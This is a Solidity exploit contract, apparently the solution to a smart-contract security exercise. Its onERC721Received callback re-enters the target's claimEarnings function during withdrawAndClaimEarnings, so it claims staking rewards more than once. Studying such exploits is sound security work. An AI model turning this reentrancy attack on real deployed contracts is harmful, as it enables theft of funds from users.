//SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./RewardToken.sol";
import "hardhat/console.sol";

contract RewardTokenAttacker is IERC721Receiver {
    NftToStake nftToStake;

    Depositoor depositoor;

    RewardToken rewardToken;

    function stake(NftToStake _nftToStake, Depositoor _depositoor) external {
        nftToStake = _nftToStake;
        depositoor = _depositoor;

        nftToStake.safeTransferFrom(address(this), address(depositoor), 42);
    }

    function attack(RewardToken _rewardToken) external {
        rewardToken = _rewardToken;
        depositoor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(address, address from, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        depositoor.claimEarnings(42);
        return IERC721Receiver.onERC721Received.selector;
    }

}